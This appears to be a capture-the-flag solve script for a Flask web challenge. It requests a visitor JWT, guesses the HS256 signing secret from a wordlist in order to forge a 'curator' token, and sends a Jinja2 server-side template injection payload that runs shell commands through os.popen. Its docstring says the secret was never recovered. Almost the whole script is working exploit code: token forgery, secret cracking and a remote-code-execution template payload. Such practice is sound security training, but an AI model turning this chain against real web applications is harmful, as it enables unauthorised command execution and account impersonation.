#!/usr/bin/env python3
"""Citrus Proof (WEB, 750) — best-attempt solve.

Target: http://54.72.82.22:8320  (Werkzeug/3.1.9, Python/3.11.16, Flask)

The intended chain, as reconstructed:

    1. POST /api/session            -> a visitor JWT (hand-rolled HS256)
    2. forge a {"role":"curator"}   JWT                          <-- BLOCKED
    3. POST /api/proof {"layout":..} with Authorization: Bearer  -> SSTI (Jinja2)
    4. read FLAG (env) / POST /submit {"answer": <proof>}        -> graded safctf{...}

Step 2 is the wall: the HS256 secret is not recoverable.  This script drives
steps 1, 3 and 4 so that the moment a key is supplied the chain completes:

    solve.py [--key SECRET]

Without --key it tries an embedded candidate list (the framework reuses
human-readable / leet secrets elsewhere in this set, e.g. "V4ultK3y12345678"
in Secret Vault and a double-base64 taunt as Ginger Juice Shop's app.secret_key).
Everything tried against :8320 came back 400 (bad signature) — see NOTES.md.
"""
import argparse
import base64
import hashlib
import hmac
import json
import sys
import urllib.error
import urllib.request

BASE = "http://54.72.82.22:8320"
HDR = b'{"alg": "HS256", "typ": "JWT"}'          # note the spaces -> json.dumps default
TMPL_CMD = "{{(lipsum|attr(request.args.g))[request.args.m]['popen'](request.args.c)|attr('read')()}}"


def b64u(b: bytes) -> str:
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()


def req(method, path, body=None, token=None, params=None):
    url = BASE + path
    if params:
        url += "?" + "&".join(f"{k}={v}" for k, v in params.items())
    data = body.encode() if isinstance(body, str) else body
    headers = {"Content-Type": "application/json"}
    if token:
        headers["Authorization"] = "Bearer " + token
    r = urllib.request.Request(url, data=data, headers=headers, method=method)
    try:
        with urllib.request.urlopen(r, timeout=10) as resp:
            return resp.status, resp.read().decode(errors="replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode(errors="replace")


def visitor_token():
    st, txt = req("POST", "/api/session", "{}")
    tok = json.loads(txt)["token"]
    payload = tok.split(".")[1]
    payload = json.loads(base64.urlsafe_b64decode(payload + "=" * (-len(payload) % 4)))
    return tok, payload


def forge(key: bytes, role="curator"):
    pl = json.dumps({"role": role}).encode()
    msg = (b64u(HDR) + "." + b64u(pl)).encode()
    sig = b64u(hmac.new(key, msg, hashlib.sha256).digest())
    return msg.decode() + "." + sig


def candidates():
    """Small high-value list; the big ones (rockyou 14.3M, xato-1M, jwt-secrets
    104k, brute [a-z0-9]<=5 / [a-zA-Z0-9]<=4) were run offline and all failed."""
    words = ["citrus", "citrusproof", "citrus-proof", "citrus_proof", "proof",
             "curator", "citrusstudio", "visitor", "secret", "secretkey",
             "jwtsecret", "jwt-secret", "key", "supersecret", "changeme",
             "dev-secret-key", "hostsecret", "26-WEB-007", "pwnzone"]
    cands = set(words)
    for w in list(words):
        cands.add(w.upper())
        cands.add(w.capitalize())
        cands.add(w + "123")
        cands.add(w + "1234")
        cands.add(w + "12345678")
        cands.add(w + "!")
        cands.add(w + "2024")
        cands.add(w + "_secret")
        cands.add(w + "-secret")
    cands |= {"V4ultK3y12345678",
              "Was it really supposed to be secretive?",
              "Was it really supposed to be secretive",
              "VjFGeklHbDBJSEpsWVd4c2VTQnpkWEJ3YjNObFpDQjBieUJpWlNCelpXTnlaWFJwZG1VLw==",
              "V2FzIGl0IHJlYWxseSBzdXBwb3NlZCB0byBiZSBzZWNyZXRpdmU/"}
    return sorted(cands)


def find_key(verbose=True):
    tok, _ = visitor_token()
    h, p, _ = tok.split(".")
    sig = base64.urlsafe_b64decode(tok.split(".")[2] + "=" * (-len(tok.split(".")[2]) % 4))
    msg = (h + "." + p).encode()
    for w in candidates():
        if hmac.new(w.encode(), msg, hashlib.sha256).digest() == sig:
            return w
    return None


def ssti(token, role="curator"):
    """Try the /api/proof SSTI and pull the command output out of the reply."""
    def run(cmd):
        st, txt = req("POST", "/api/proof", json.dumps({"layout": "x"}), token,
                      params={"g": "__globals__", "m": "os", "c": cmd})
        return st, txt
    st, txt = run("id")
    return st, txt


def submit(answer):
    return req("POST", "/submit", json.dumps({"answer": answer}))


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--key", help="HS256 secret to forge the curator token with")
    args = ap.parse_args()

    print("[*] target", BASE)
    tok, payload = visitor_token()
    print("[*] visitor JWT payload:", payload)
    print("[*] /api/proof with visitor token ->", req("POST", "/api/proof", '{"layout":"x"}', tok)[0], "(403 = sig ok, role wrong)")

    key = args.key
    if key is None:
        print("[*] trying embedded candidate secrets ...")
        key = find_key()
    if key is None:
        print("[-] no HS256 secret found. BLOCKED.")
        print("    the signature is a correct HMAC-SHA256 over header.payload;")
        print("    it is not crackable from the lists we have (see NOTES.md).")
        return 2

    print("[+] key =", repr(key))
    cur = forge(key.encode())
    st, txt = ssti(cur)
    print("[*] /api/proof (curator) ->", st, txt[:300])
    if st == 200:
        st2, txt2 = submit(txt.strip()[:512])
        print("[*] /submit ->", st2, txt2[:300])
    return 0


if __name__ == "__main__":
    sys.exit(main())
